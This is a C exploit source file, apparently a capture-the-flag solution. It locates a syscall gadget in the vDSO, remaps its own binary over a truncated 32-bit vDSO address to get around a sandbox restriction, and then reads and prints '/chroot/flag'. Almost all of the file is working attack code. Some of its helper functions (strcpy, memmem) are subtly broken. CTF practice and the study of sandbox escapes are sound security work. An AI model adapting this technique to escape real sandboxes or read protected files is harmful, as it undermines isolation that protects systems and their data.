// nasm -f elf64 syscall.s && gcc exploit.c syscall.o -Wl,--section-start=.sysexit=0x7fff0000 -fno-PIE -nostdlib -no-pie -z noexecstack -o exploit
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap64(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
void *mmap32(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int munmap(void *addr, size_t length);
int brk(void *addr);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
size_t strlen(const char *s);
char *strcpy(char *dest, const char *src);
int puts(const char *s);
static void dump(void *buf, size_t size);
void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t ne_len);

uintptr_t addr_syscall;
uint8_t *vdso;
uint8_t stack[0x1000];

int main(int argc, char *argv[], char *envp[]);

void _start(void){
	register void *rsp asm("rsp");
	register void *rbp asm("rbp");
	int argc;
	char **argv, **envp;

	argc = ((uint64_t *)rbp)[1];
	argv = (char**)((uint64_t *)rbp+2);
	envp = (char**)((uint64_t *)rbp+3+argc);

	char **p = envp;
	while(*p++);
	vdso = *(uint8_t**)(p+1);
	addr_syscall = (uintptr_t)memmem(vdso, 0x1000, (char[]){"\x05\x31\xd2\x89"}, 4)-1;

	rsp = stack + sizeof(stack);
	exit(main(argc, argv, envp));
}

#define ADDR_FILENAME ((char*)0x31337)

int main(int argc, char *argv[], char *envp[]){
	int fd;
	char buf[0x100];

	if(mmap64((void*)0x31000, 0x1000, PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) != (void*)0x31000)
		return -1;

	strcpy(ADDR_FILENAME, "/proc/self/exe");
	if((fd = open(ADDR_FILENAME, O_RDONLY)) < 0)
		return -1;

	uintptr_t addr_vdso32 = (uint64_t)(uint32_t)(uint64_t)vdso;
	if(mmap32((void*)addr_vdso32, 0x1000, PROT_READ|PROT_EXEC, MAP_32BIT|MAP_SHARED|MAP_FIXED, fd, 0x3000) != (void*)addr_vdso32)
		return -1;

	close(fd);

	strcpy(ADDR_FILENAME, "/chroot/flag");
	if((fd = open(ADDR_FILENAME, O_RDONLY)) < 0)
		return -1;

	read(fd, buf, sizeof(buf));
	close(fd);

	puts(buf);

	return 137;
}

/* utils */
void *memset(void *s, int c, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(s+i) = (char)c;
	return s;
}

void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

size_t strlen(const char *s){
	uint64_t i;
	for(i=0; s[i]; i++);
	return i;
}

char *strcpy(char *dest, const char *src){
	memcpy(dest, src, strlen(src));
}

int puts(const char *s){
	int n;

	n = write(1, (void*)s, strlen(s));
	write(1, "\n", 1);

	return n;
}

#ifdef USE_STDLIB
static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
#else
static void dump(void *buf, size_t size) {
	uint8_t *tb = buf;
	char sym[] = "0123456789abcdef";

	if (!tb)
		return;

	for (uint64_t i=0; i<size; i++) {
		write(1, &sym[(tb[i]&0xf0) >> 4], 1);
		write(1, &sym[(tb[i]&0x0f) >> 0], 1);
		write(1, " ", 1);
		if(i%8 == 7)
			write(1, " ", 1);
		if(i%64 == 63)
			write(1, "\n", 1);
	}
	write(1, "\n", 1);
}
#endif

int memcmp(const void *str1, const void *str2, size_t count) {
	register const unsigned char *s1 = (const unsigned char*)str1;
	register const unsigned char *s2 = (const unsigned char*)str2;

	while(count--){
		if(*s1++ != *s2++)
			return s1[-1] < s2[-1] ? -1 : 1;
	}
	return 0;
}

void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t ne_len){
	if(!haystack || !hs_len || !needle || !ne_len)
		return NULL;

	for(size_t st = 0; st < hs_len; st++)
		if(((uint8_t*)haystack)[st] == ((uint8_t*)needle)[0] && !memcmp(haystack+st, needle, ne_len))
			return &((uint8_t*)haystack)[st];
}
